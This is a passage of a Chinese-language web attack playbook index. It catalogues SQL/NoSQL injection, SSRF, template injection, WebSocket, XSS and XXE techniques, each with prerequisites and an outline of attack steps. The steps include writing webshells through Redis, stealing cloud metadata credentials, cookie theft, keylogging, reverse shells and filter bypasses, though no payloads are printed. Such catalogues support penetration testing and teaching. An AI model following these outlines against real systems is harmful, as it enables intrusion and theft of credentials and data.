- Tags: sqli, oracle, advanced, rce
- Original Extracted Source: original extracted web-security-wiki source/sqli-oracle-advanced.md
Description:
Oracle高级注入技术：Java存储过程、UTL_FILE文件操作
Prerequisites:
- Oracle高权限
- Java虚拟机可用
Execution Outline:
1. 1. 检测Java权限
2. 2. 创建Java执行函数
3. 3. UTL_FILE读取文件
## PostgreSQL注入 - 基础探测
- ID: sqli-postgres-basic
- Difficulty: intermediate
- Subcategory: PostgreSQL
- Tags: sqli, postgresql, postgres, injection
- Original Extracted Source: original extracted web-security-wiki source/sqli-postgres-basic.md
Description:
PostgreSQL数据库注入技术
Prerequisites:
- 目标存在SQL注入点
- 后端使用PostgreSQL
Execution Outline:
1. 1. 探测注入点
2. 2. 获取版本信息
3. 3. 获取表名
4. 4. 获取列名
## SQLite注入
- ID: sqli-sqlite-basic
- Difficulty: intermediate
- Subcategory: SQLite
- Tags: sqli, sqlite
- Original Extracted Source: original extracted web-security-wiki source/sqli-sqlite-basic.md
Description:
SQLite数据库注入攻击
Prerequisites:
- SQLite数据库
- 存在注入点
Execution Outline:
1. 1. 探测注入点
2. 2. 获取版本
3. 3. 获取表名
4. 4. 获取表结构
## MongoDB注入
- ID: sqli-mongodb-basic
- Difficulty: intermediate
- Subcategory: MongoDB
- Tags: nosql, mongodb, injection
- Original Extracted Source: original extracted web-security-wiki source/sqli-mongodb-basic.md
Description:
NoSQL数据库注入攻击技术
Prerequisites:
- 目标使用MongoDB
- 存在用户输入拼接查询
Execution Outline:
1. 1. 探测注入点
2. 2. 绕过认证
3. 3. 逻辑运算注入
4. 4. 正则注入
## Redis未授权访问
- ID: sqli-redis
- Difficulty: intermediate
- Subcategory: Redis
- Tags: redis, nosql, injection
- Original Extracted Source: original extracted web-security-wiki source/sqli-redis.md
Description:
Redis未授权访问和命令注入
Prerequisites:
- Redis服务可访问
- 未授权或弱密码
Execution Outline:
1. 1. 探测Redis
2. 2. 未授权访问
3. 3. 写入Webshell
4. 4. 写入SSH公钥
## 布尔盲注
- ID: sqli-blind
- Difficulty: intermediate
- Subcategory: 盲注
- Tags: sqli, blind, boolean
- Original Extracted Source: original extracted web-security-wiki source/sqli-blind.md
Description:
基于布尔条件的SQL盲注技术
Prerequisites:
- 存在SQL注入
- 页面有真/假两种不同响应
Execution Outline:
1. 1. 确认盲注
2. 2. 获取数据库名长度
3. 3. 逐字符枚举数据库名
4. 4. 使用工具自动化
## 时间盲注
- ID: sqli-time-based
- Difficulty: intermediate
- Subcategory: 盲注
- Tags: sqli, blind, time
- Original Extracted Source: original extracted web-security-wiki source/sqli-time-based.md
Description:
基于时间延迟的SQL盲注技术
Prerequisites:
- 存在SQL注入
- 页面响应时间可控
Execution Outline:
1. 1. 确认时间盲注
2. 2. 获取数据库名长度
3. 3. 逐字符提取
4. 4. 不同数据库延时函数
## 报错注入
- ID: sqli-error-based
- Difficulty: intermediate
- Subcategory: 报错注入
- Tags: sqli, error, extractvalue
- Original Extracted Source: original extracted web-security-wiki source/sqli-error-based.md
Description:
利用错误信息提取数据的SQL注入
Prerequisites:
- 存在SQL注入
- 错误信息会显示在页面上
Execution Outline:
1. 1. 确认报错注入
2. 2. 获取数据库信息
3. 3. 获取表名
4. 4. 获取数据
## 二阶SQL注入
- ID: sqli-second-order
- Difficulty: advanced
- Subcategory: 二阶注入
- Tags: sqli, second-order, stored
- Original Extracted Source: original extracted web-security-wiki source/sqli-second-order.md
Description:
存储后触发的SQL注入攻击
Prerequisites:
- 存在数据存储功能
- 存储数据被二次使用
Execution Outline:
1. 1. 探测二阶注入
2. 2. 用户名注入
3. 3. 密码重置注入
4. 4. 订单/评论注入
## 联合查询注入
- ID: sqli-union
- Difficulty: beginner
- Subcategory: 联合查询
- Tags: sqli, union, select
- Original Extracted Source: original extracted web-security-wiki source/sqli-union.md
Description:
使用UNION SELECT提取数据
Prerequisites:
- 存在注入点
- 可显示查询结果
Execution Outline:
1. 1. 确定列数
2. 2. 确定显示列
3. 3. 提取数据
4. 4. 绕过过滤
## 堆叠查询注入
- ID: sqli-stacked
- Difficulty: intermediate
- Subcategory: 堆叠查询
- Tags: sqli, stacked, queries
- Original Extracted Source: original extracted web-security-wiki source/sqli-stacked.md
Description:
执行多条SQL语句的注入
Prerequisites:
- 支持多语句执行
- MySQL/PostgreSQL/MSSQL
Execution Outline:
1. 1. 探测堆叠查询
2. 2. MySQL堆叠查询
3. 3. MSSQL堆叠查询
4. 4. PostgreSQL堆叠查询
## SQL注入WAF绕过
- ID: sqli-waf-bypass
- Difficulty: advanced
- Subcategory: WAF绕过
- Tags: sqli, waf, bypass
- Original Extracted Source: original extracted web-security-wiki source/sqli-waf-bypass.md
Description:
绕过Web应用防火墙的技术
Prerequisites:
- 目标存在SQL注入点
- 存在WAF防护
Execution Outline:
1. 分块传输编码
2. HTTP参数污染(HPP)
3. 等价函数替换
4. 无逗号注入

---

## Source: 19-ssrf-server-side-request-forgery.md

Path: references\web-playbook-19-ssrf-server-side-request-forgery.md

# SSRF服务端请求伪造
English: SSRF Server-Side Request Forgery
- Entry Count: 12
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## 基础SSRF攻击
- ID: ssrf-basic
- Difficulty: intermediate
- Subcategory: 基础攻击
- Tags: ssrf, server-side, request
- Original Extracted Source: original extracted web-security-wiki source/ssrf-basic.md
Description:
服务端请求伪造基础攻击技术
Prerequisites:
- 存在URL输入点
- 服务器会请求用户提供的URL
Execution Outline:
1. 1. 探测SSRF
2. 2. 扫描内网端口
3. 3. 访问内网服务
4. 4. 读取本地文件
## AWS元数据攻击
- ID: ssrf-cloud-aws
- Difficulty: intermediate
- Subcategory: 云元数据
- Tags: ssrf, aws, metadata, cloud
- Original Extracted Source: original extracted web-security-wiki source/ssrf-cloud-aws.md
Description:
利用SSRF访问AWS EC2元数据服务
Prerequisites:
- 存在SSRF漏洞
- 目标运行在AWS EC2上
Execution Outline:
1. 1. 访问元数据服务
2. 2. 获取IAM凭证
3. 3. 获取用户数据
4. 4. 使用IMDSv2绕过
## GCP元数据攻击
- ID: ssrf-cloud-gcp
- Difficulty: intermediate
- Subcategory: GCP元数据
- Tags: ssrf, gcp, cloud, metadata
- Original Extracted Source: original extracted web-security-wiki source/ssrf-cloud-gcp.md
Description:
利用SSRF攻击Google Cloud元数据服务
Prerequisites:
- 存在SSRF漏洞
- 目标运行在GCP环境
Execution Outline:
1. 1. 访问元数据服务
2. 2. 获取访问令牌
3. 3. 获取服务账户信息
4. 4. 获取项目信息
## Azure元数据攻击
- ID: ssrf-cloud-azure
- Difficulty: intermediate
- Subcategory: Azure元数据
- Tags: ssrf, azure, cloud, metadata
- Original Extracted Source: original extracted web-security-wiki source/ssrf-cloud-azure.md
Description:
利用SSRF攻击Azure元数据服务
Prerequisites:
- 存在SSRF漏洞
- 目标运行在Azure环境
Execution Outline:
1. 1. 访问元数据服务
2. 2. 获取访问令牌
3. 3. 获取计算信息
4. 4. 获取网络信息
## SSRF协议利用
- ID: ssrf-protocol
- Difficulty: intermediate
- Subcategory: 协议利用
- Tags: ssrf, protocol, file, gopher
- Original Extracted Source: original extracted web-security-wiki source/ssrf-protocol.md
Description:
利用各种协议进行SSRF攻击
Prerequisites:
- 存在SSRF漏洞
- 服务器支持多种协议
Execution Outline:
1. 1. File协议
2. 2. Dict协议
3. 3. Gopher协议
4. 4. LDAP协议
## Gopher协议攻击
- ID: ssrf-gopher
- Difficulty: advanced
- Subcategory: Gopher攻击
- Tags: ssrf, gopher, redis, mysql
- Original Extracted Source: original extracted web-security-wiki source/ssrf-gopher.md
Description:
利用Gopher协议攻击内网服务
Prerequisites:
- 存在SSRF漏洞
- 服务器支持Gopher协议
Execution Outline:
1. 1. Gopher基础格式
2. 2. 攻击Redis
3. 3. 攻击MySQL
4. 4. 攻击FastCGI
## Dict协议攻击
- ID: ssrf-dict
- Difficulty: intermediate
- Subcategory: Dict协议
- Tags: ssrf, dict, redis, memcached
- Original Extracted Source: original extracted web-security-wiki source/ssrf-dict.md
Description:
利用Dict协议探测和攻击内网服务
Prerequisites:
- 存在SSRF漏洞
- 服务器支持Dict协议
Execution Outline:
1. 1. Dict协议格式
2. 2. 探测Redis
3. 3. 探测Memcached
4. 4. Redis写入文件
## File协议攻击
- ID: ssrf-file
- Difficulty: beginner
- Subcategory: File协议
- Tags: ssrf, file, lfi, read
- Original Extracted Source: original extracted web-security-wiki source/ssrf-file.md
Description:
利用File协议读取本地文件
Prerequisites:
- 存在SSRF漏洞
- 服务器支持File协议
Execution Outline:
1. 1. Linux敏感文件
2. 2. Windows敏感文件
3. 3. Web配置文件
4. 4. 云环境文件
## SSRF绕过技术
- ID: ssrf-bypass
- Difficulty: intermediate
- Subcategory: 绕过技术
- Tags: ssrf, bypass, waf, filter
- Original Extracted Source: original extracted web-security-wiki source/ssrf-bypass.md
Description:
各种绕过SSRF过滤的技术
Prerequisites:
- 存在SSRF漏洞
- 存在过滤机制
Execution Outline:
1. 1. IP格式绕过
2. 2. URL解析差异
3. 3. 重定向绕过
4. 4. DNS重绑定
## DNS重绑定攻击
- ID: ssrf-dns-rebinding
- Difficulty: advanced
- Subcategory: DNS重绑定
- Tags: ssrf, dns, rebinding, bypass
- Original Extracted Source: original extracted web-security-wiki source/ssrf-dns-rebinding.md
Description:
利用DNS重绑定绕过SSRF防护
Prerequisites:
- 存在SSRF漏洞
- 存在DNS解析验证
Execution Outline:
1. 1. DNS重绑定原理
2. 2. 使用公开服务
3. 3. 自建DNS服务器
4. 4. 攻击流程
## SSRF攻击Redis
- ID: ssrf-redis
- Difficulty: intermediate
- Subcategory: Redis攻击
- Tags: ssrf, redis, rce, webshell
- Original Extracted Source: original extracted web-security-wiki source/ssrf-redis.md
Description:
利用SSRF攻击内网Redis服务
Prerequisites:
- 存在SSRF漏洞
- 内网存在未授权Redis
Execution Outline:
1. 1. 探测Redis
2. 2. 写入WebShell
3. 3. 写入SSH公钥
4. 4. 写入Cron任务
## SSRF攻击MySQL
- ID: ssrf-mysql
- Difficulty: advanced
- Subcategory: MySQL攻击
- Tags: ssrf, mysql, gopher, database
- Original Extracted Source: original extracted web-security-wiki source/ssrf-mysql.md
Description:
利用SSRF攻击内网MySQL服务
Prerequisites:
- 存在SSRF漏洞
- 内网存在MySQL服务
- 知道MySQL用户名
Execution Outline:
1. 1. MySQL协议基础
2. 2. 使用Gopher攻击MySQL
3. 3. 使用工具生成Payload
4. 4. 执行SQL命令

---

## Source: 20-ssti-template-injection.md

Path: references\web-playbook-20-ssti-template-injection.md

# SSTI模板注入
English: SSTI Template Injection
- Entry Count: 10
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## Jinja2模板注入
- ID: ssti-jinja2
- Difficulty: advanced
- Subcategory: Jinja2
- Tags: ssti, jinja2, twig, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-jinja2.md
Description:
Jinja2/Twig模板注入攻击技术
Prerequisites:
- 使用Jinja2/Twig模板引擎
- 用户输入直接渲染到模板
Execution Outline:
1. 1. 探测SSTI
2. 2. 信息收集
3. 3. 命令执行
4. 4. 反弹Shell
## FreeMarker模板注入
- ID: ssti-freemarker
- Difficulty: intermediate
- Subcategory: FreeMarker
- Tags: ssti, freemarker, java, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-freemarker.md
Description:
FreeMarker模板引擎注入攻击技术
Prerequisites:
- 使用FreeMarker模板引擎
- 用户输入直接渲染到模板
Execution Outline:
1. 1. 探测SSTI
2. 2. 信息收集
3. 3. 命令执行 - new
4. 4. 命令执行 - api
## Velocity模板注入
- ID: ssti-velocity
- Difficulty: advanced
- Subcategory: Velocity
- Tags: ssti, velocity, java, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-velocity.md
Description:
Velocity模板引擎注入攻击技术
Prerequisites:
- 使用Velocity模板引擎
- 用户输入直接渲染到模板
Execution Outline:
1. 1. 探测SSTI
2. 2. 信息收集
3. 3. 命令执行 - ClassTool
4. 4. 命令执行 - 反射
## Thymeleaf模板注入
- ID: ssti-thymeleaf
- Difficulty: intermediate
- Subcategory: Thymeleaf
- Tags: ssti, thymeleaf, java, spring, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-thymeleaf.md
Description:
Thymeleaf模板引擎注入攻击技术
Prerequisites:
- 使用Thymeleaf模板引擎
- Spring框架
- 用户输入直接渲染到模板
Execution Outline:
1. 1. 探测SSTI
2. 2. 信息收集
3. 3. 命令执行 - Spring表达式
4. 4. 命令执行 - ProcessBuilder
## Smarty模板注入
- ID: ssti-smarty
- Difficulty: intermediate
- Subcategory: Smarty
- Tags: ssti, smarty, php, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-smarty.md
Description:
Smarty模板引擎注入攻击技术
Prerequisites:
- 使用Smarty模板引擎
- 用户输入直接渲染到模板
Execution Outline:
1. 1. 探测SSTI
2. 2. 信息收集
3. 3. 命令执行 - system
4. 4. 命令执行 - passthru
## Mako模板注入
- ID: ssti-mako
- Difficulty: intermediate
- Subcategory: Mako
- Tags: ssti, mako, python, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-mako.md
Description:
Mako模板引擎注入攻击技术
Prerequisites:
- 使用Mako模板引擎
- 用户输入直接渲染到模板
Execution Outline:
1. 1. 探测SSTI
2. 2. 信息收集
3. 3. 命令执行 - os模块
4. 4. 命令执行 - subprocess
## Tornado模板注入
- ID: ssti-tornado
- Difficulty: intermediate
- Subcategory: Tornado
- Tags: ssti, tornado, python, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-tornado.md
Description:
Tornado模板引擎注入攻击技术
Prerequisites:
- 使用Tornado模板引擎
- 用户输入直接渲染到模板
Execution Outline:
1. 1. 探测SSTI
2. 2. 信息收集
3. 3. 命令执行 - os
4. 4. 命令执行 - subprocess
## Django模板注入
- ID: ssti-django
- Difficulty: intermediate
- Subcategory: Django
- Tags: ssti, django, python, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-django.md
Description:
Django模板引擎注入攻击技术
Prerequisites:
- 使用Django模板引擎
- 用户输入直接渲染到模板
Execution Outline:
1. 1. 探测SSTI
2. 2. 信息收集
3. 3. 命令执行 - 通过settings
4. 4. 命令执行 - 对象链
## ERB模板注入
- ID: ssti-erb
- Difficulty: intermediate
- Subcategory: ERB
- Tags: ssti, erb, ruby, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-erb.md
Description:
ERB(Ruby)模板引擎注入攻击技术
Prerequisites:
- 使用ERB模板引擎
- 用户输入直接渲染到模板
Execution Outline:
1. 1. 探测SSTI
2. 2. 信息收集
3. 3. 命令执行 - 反引号
4. 4. 命令执行 - system
## Pug/Jade模板注入
- ID: ssti-pug
- Difficulty: intermediate
- Subcategory: Pug
- Tags: ssti, pug, jade, nodejs, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-pug.md
Description:
Pug/Jade模板引擎注入攻击技术
Prerequisites:
- 使用Pug/Jade模板引擎
- 用户输入直接渲染到模板
Execution Outline:
1. 1. 探测SSTI
2. 2. 信息收集
3. 3. 命令执行 - child_process
4. 4. 命令执行 - execSync

---

## Source: 21-websocket-security.md

Path: references\web-playbook-21-websocket-security.md

# WebSocket安全
English: WebSocket Security
- Entry Count: 3
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## WebSocket跨站劫持(CSWSH)
- ID: ws-hijack
- Difficulty: intermediate
- Subcategory: WebSocket劫持
- Tags: WebSocket, CSWSH, Origin, 跨站, 会话劫持
- Original Extracted Source: original extracted web-security-wiki source/ws-hijack.md
Description:
利用WebSocket握手阶段缺少Origin验证的漏洞，通过恶意网页建立跨站WebSocket连接。攻击者可劫持受害者的WebSocket会话，窃取实时数据或以受害者身份发送消息。类似于CSRF但针对WebSocket协议。
Prerequisites:
- 目标使用WebSocket通信
- WebSocket握手未验证Origin
Execution Outline:
1. 1. 识别WebSocket端点
2. 2. 构造跨站劫持POC页面
3. 3. WebSocket消息注入
4. 4. WebSocket流量分析脚本
## WebSocket走私攻击
- ID: ws-smuggling
- Difficulty: expert
- Subcategory: WebSocket走私
- Tags: WebSocket, 走私, 反向代理, H2C, 内网穿透
- Original Extracted Source: original extracted web-security-wiki source/ws-smuggling.md
Description:
利用反向代理/负载均衡器对WebSocket协议处理的差异，通过WebSocket升级请求走私HTTP请求到内网服务。攻击者可绕过前端安全控制直接与后端通信，访问受保护的内部API或管理接口。
Prerequisites:
- 目标使用反向代理(Nginx/Varnish等)
- 代理允许WebSocket升级
- 后端存在内部服务
Execution Outline:
1. 1. 检测WebSocket走私可能性
2. 2. WebSocket隧道构造
3. 3. H2C走私绕过访问控制
4. 4. 反向代理差异利用
## WebSocket认证与授权绕过
- ID: ws-auth-bypass
- Difficulty: intermediate
- Subcategory: 认证绕过
- Tags: WebSocket, 认证, 授权, 越权, Token重放
- Original Extracted Source: original extracted web-security-wiki source/ws-auth-bypass.md
Description:
利用WebSocket连接建立后缺少持续认证检查的漏洞，通过会话固定、令牌重放、频道越权订阅等方式绕过认证和授权机制。WebSocket的长连接特性使得权限变更后原连接仍可保持访问。
Prerequisites:
- 目标使用WebSocket实时通信
- 已获取有效会话/Token
Execution Outline:
1. 1. WebSocket认证机制分析
2. 2. Token重放与会话固定
3. 3. 频道/房间越权订阅
4. 4. WebSocket速率限制与DoS测试

---

## Source: 22-xss-cross-site-scripting.md

Path: references\web-playbook-22-xss-cross-site-scripting.md

# XSS跨站脚本
English: XSS Cross-Site Scripting
- Entry Count: 12
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## 反射型XSS
- ID: xss-reflected
- Difficulty: beginner
- Subcategory: 反射型
- Tags: xss, reflected, javascript
- Original Extracted Source: original extracted web-security-wiki source/xss-reflected.md
Description:
反射型跨站脚本攻击技术
Prerequisites:
- 存在用户输入反射到页面
- 输入未经过滤或编码
Execution Outline:
1. 1. 探测XSS注入点
2. 2. 事件处理器绕过
3. 3. 标签绕过
4. 4. 窃取Cookie
## 存储型XSS
- ID: xss-stored
- Difficulty: intermediate
- Subcategory: 存储型
- Tags: xss, stored, persistent
- Original Extracted Source: original extracted web-security-wiki source/xss-stored.md
Description:
存储型跨站脚本攻击技术
Prerequisites:
- 存在数据存储功能
- 存储数据未经过滤显示
Execution Outline:
1. 1. 探测存储点
2. 2. 隐蔽Payload
3. 3. 持久化控制
4. 4. BeEF Hook
## DOM型XSS
- ID: xss-dom
- Difficulty: intermediate
- Subcategory: DOM型
- Tags: xss, dom, javascript
- Original Extracted Source: original extracted web-security-wiki source/xss-dom.md
Description:
基于DOM的跨站脚本攻击
Prerequisites:
- 存在JavaScript动态操作DOM
- 用户输入直接写入DOM
Execution Outline:
1. 1. 探测DOM XSS
2. 2. 常见Sink点
3. 3. location.hash利用
4. 4. postMessage利用
## CSP绕过
- ID: xss-csp-bypass
- Difficulty: advanced
- Subcategory: CSP绕过
- Tags: xss, csp, bypass
- Original Extracted Source: original extracted web-security-wiki source/xss-csp-bypass.md
Description:
绕过内容安全策略(CSP)的XSS技术
Prerequisites:
- 存在XSS漏洞
- 存在CSP策略但配置不当
Execution Outline:
1. 1. 分析CSP策略
2. 2. 利用unsafe-inline
3. 3. 利用unsafe-eval
4. 4. JSONP绕过
## 突变型XSS(mXSS)
- ID: xss-mxss
- Difficulty: advanced
- Subcategory: 突变型
- Tags: xss, mxss, mutation, bypass
- Original Extracted Source: original extracted web-security-wiki source/xss-mxss.md
Description:
利用浏览器解析差异导致的XSS攻击
Prerequisites:
- 存在HTML输出点
- 浏览器解析差异
Execution Outline:
1. 1. 基础mXSS探测
2. 2. SVG mXSS
3. 3. Math mXSS
4. 4. DOM clobbering配合
## Unicode XSS
- ID: xss-unicode
- Difficulty: intermediate
- Subcategory: Unicode编码
- Tags: xss, unicode, encoding, bypass
- Original Extracted Source: original extracted web-security-wiki source/xss-unicode.md
Description:
利用Unicode编码特性绕过过滤
Prerequisites:
- 存在XSS注入点
- 过滤器检查关键字
Execution Outline:
1. 1. Unicode转义
2. 2. HTML实体编码
3. 3. Unicode规范化攻击
4. 4. UTF-7编码
## XSS过滤器绕过
- ID: xss-filter-bypass
- Difficulty: intermediate
- Subcategory: 过滤器绕过
- Tags: xss, filter, bypass, waf
- Original Extracted Source: original extracted web-security-wiki source/xss-filter-bypass.md
Description:
各种绕过XSS过滤器的技术
Prerequisites:
- 存在XSS注入点
- 存在过滤机制
Execution Outline:
1. 1. 大小写混淆
2. 2. 双写绕过
3. 3. 注释混淆
4. 4. 空字节截断
## XSS编码绕过
- ID: xss-encoding
- Difficulty: intermediate
- Subcategory: 编码绕过
- Tags: xss, encoding, bypass
- Original Extracted Source: original extracted web-security-wiki source/xss-encoding.md
Description:
利用各种编码技术绕过XSS过滤
Prerequisites:
- 存在XSS注入点
- 存在编码处理
Execution Outline:
1. 1. URL编码
2. 2. HTML实体编码
3. 3. JavaScript编码
4. 4. CSS编码
## Polyglot XSS
- ID: xss-polyglot
- Difficulty: intermediate
- Subcategory: Polyglot
- Tags: xss, polyglot, universal
- Original Extracted Source: original extracted web-security-wiki source/xss-polyglot.md
Description:
多环境通用的XSS payload
Prerequisites:
- 存在XSS注入点
- 不确定具体环境
Execution Outline:
1. 1. 经典Polyglot
2. 2. 短Polyglot
3. 3. 属性注入Polyglot
4. 4. URL参数Polyglot
## XSS Cookie窃取
- ID: xss-cookie-theft
- Difficulty: beginner
- Subcategory: Cookie窃取
- Tags: xss, cookie, theft, session
- Original Extracted Source: original extracted web-security-wiki source/xss-cookie-theft.md
Description:
利用XSS窃取用户Cookie
Prerequisites:
- 存在XSS漏洞
- Cookie未设置HttpOnly
Execution Outline:
1. 1. 基础Cookie窃取
2. 2. Fetch API窃取
3. 3. XMLHttpRequest窃取
4. 4. 编码传输
## XSS键盘记录
- ID: xss-keylogger
- Difficulty: intermediate
- Subcategory: 键盘记录
- Tags: xss, keylogger, credential
- Original Extracted Source: original extracted web-security-wiki source/xss-keylogger.md
Description:
利用XSS记录用户键盘输入
Prerequisites:
- 存在存储型XSS
- 目标页面有敏感输入
Execution Outline:
1. 1. 基础键盘记录
2. 2. 完整键盘记录
3. 3. 表单窃取
4. 4. 表单提交劫持
## BeEF框架利用
- ID: xss-beef
- Difficulty: advanced
- Subcategory: BeEF利用
- Tags: xss, beef, framework, exploitation
- Original Extracted Source: original extracted web-security-wiki source/xss-beef.md
Description:
使用BeEF框架进行XSS利用
Prerequisites:
- 存在XSS漏洞
- 部署BeEF服务器
Execution Outline:
1. 1. 部署BeEF
2. 2. 注入Hook脚本
3. 3. 常用命令
4. 4. 模块利用

---

## Source: 23-xxe-entity-injection.md

Path: references\web-playbook-23-xxe-entity-injection.md

# XXE实体注入
English: XXE Entity Injection
- Entry Count: 9
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## XXE基础攻击
- ID: xxe-basic
- Difficulty: intermediate
- Subcategory: 基础攻击
- Tags: xxe, xml, external, entity
- Original Extracted Source: original extracted web-security-wiki source/xxe-basic.md
Description:
XML外部实体注入基础攻击技术
Prerequisites:
- 存在XML解析功能
- 外部实体未被禁用
Execution Outline:
1. 1. 探测XXE
2. 2. 读取文件
3. 3. 读取PHP源码
4. 4. SSRF攻击
## 盲注XXE攻击
- ID: xxe-blind
- Difficulty: intermediate
- Subcategory: 盲注XXE
- Tags: xxe, blind, oob, xml
- Original Extracted Source: original extracted web-security-wiki source/xxe-blind.md
Description:
无回显的XXE攻击技术
Prerequisites:
- 存在XML解析
- 无直接回显
Execution Outline:
1. 1. 外部实体探测
2. 2. 参数实体
3. 3. OOB外带数据
## XXE OOB外带攻击
- ID: xxe-oob
- Difficulty: intermediate
- Subcategory: OOB外带
- Tags: xxe, oob, exfiltration, xml
- Original Extracted Source: original extracted web-security-wiki source/xxe-oob.md
Description:
利用OOB技术外带XXE数据
Prerequisites:
- 存在XXE漏洞
- 可发起外部请求
Execution Outline:
1. 1. HTTP外带
2. 2. FTP外带
3. 3. DNS外带
## XXE+SSRF组合攻击
- ID: xxe-ssrf
- Difficulty: intermediate
- Subcategory: XXE+SSRF
- Tags: xxe, ssrf, combination, xml
- Original Extracted Source: original extracted web-security-wiki source/xxe-ssrf.md
Description:
利用XXE实现SSRF攻击
Prerequisites:
- 存在XXE漏洞
- 内网可访问
Execution Outline:
1. 1. 扫描内网端口
2. 2. 访问内网服务
## XXE到RCE
- ID: xxe-rce
- Difficulty: advanced
- Subcategory: XXE到RCE
- Tags: xxe, rce, php, expect
- Original Extracted Source: original extracted web-security-wiki source/xxe-rce.md
Description:
利用XXE实现远程代码执行
Prerequisites:
- 存在XXE漏洞
- PHP expect扩展加载
Execution Outline:
1. 1. Expect扩展RCE
2. 2. 写入WebShell
## XXE文件读取
- ID: xxe-file-read
- Difficulty: beginner
- Subcategory: 文件读取
- Tags: xxe, file, read, lfi
- Original Extracted Source: original extracted web-security-wiki source/xxe-file-read.md
Description:
利用XXE读取服务器文件
Prerequisites:
- 存在XXE漏洞
- 有文件读取权限
Execution Outline:
1. 1. 读取Linux文件
2. 2. 读取Windows文件
3. 3. 读取Web配置
4. 4. 读取源代码
## XXE外部DTD利用
- ID: xxe-dtd
- Difficulty: intermediate
- Subcategory: 外部DTD
- Tags: xxe, dtd, external, xml
- Original Extracted Source: original extracted web-security-wiki source/xxe-dtd.md
Description:
利用外部DTD文件进行XXE攻击
Prerequisites:
- 存在XXE漏洞
- 可访问外部DTD
Execution Outline:
1. 1. 托管恶意DTD
2. 2. 引用外部DTD
3. 3. 多步骤外带
4. 4. 错误消息泄露
## XLSX文件XXE
- ID: xxe-xlsx
- Difficulty: intermediate
- Subcategory: XLSX文件XXE
- Tags: xxe, xlsx, excel, office
- Original Extracted Source: original extracted web-security-wiki source/xxe-xlsx.md
Description:
利用XLSX文件进行XXE攻击
Prerequisites:
- 应用解析XLSX文件
- 存在XXE漏洞
Execution Outline:
1. 1. 解压XLSX文件
2. 2. 注入XXE Payload
## DOCX文件XXE
- ID: xxe-docx
- Difficulty: intermediate
- Subcategory: DOCX文件XXE
- Tags: xxe, docx, word, office
- Original Extracted Source: original extracted web-security-wiki source/xxe-docx.md
Description:
利用DOCX文件进行XXE攻击
Prerequisites:
- 应用解析DOCX文件
- 存在XXE漏洞
Execution Outline:
1. 1. 解压DOCX文件
2. 2. 注入XXE Payload

---

## Source: index.md

Path: references\web-playbook-index.md

# Web Security Category Index

- 点击劫持 (2): 01-clickjacking.md
- 供应链攻击 (3): 02-supply-chain-attacks.md
- 缓存与CDN安全 (3): 03-cache-and-cdn-security.md
- 开放重定向 (3): 04-open-redirect.md
- 框架漏洞 (18): 05-framework-vulnerabilities.md
- 请求走私 (4): 06-request-smuggling.md
- 认证漏洞 (10): 07-authentication-vulnerabilities.md
- 文件漏洞 (7): 08-file-vulnerabilities.md
- 业务逻辑漏洞 (5): 09-business-logic-vulnerabilities.md
- 原型链污染 (3): 10-prototype-pollution.md
- 云安全漏洞 (4): 11-cloud-security-vulnerabilities.md
- AI安全 (4): 12-ai-security.md
- API安全 (12): 13-api-security.md
- CSRF跨站请求伪造 (8): 14-csrf-cross-site-request-forgery.md
- JWT安全 (4): 15-jwt-security.md
- LFI/RFI文件包含 (12): 16-lfi-rfi-file-inclusion.md
- RCE远程代码执行 (12): 17-rce-remote-code-execution.md
- SQL/NoSQL注入 (17): 18-sql-nosql-injection.md
- SSRF服务端请求伪造 (12): 19-ssrf-server-side-request-forgery.md
- SSTI模板注入 (10): 20-ssti-template-injection.md
- WebSocket安全 (3): 21-websocket-security.md
- XSS跨站脚本 (12): 22-xss-cross-site-scripting.md
- XXE实体注入 (9): 23-xxe-entity-injection.md







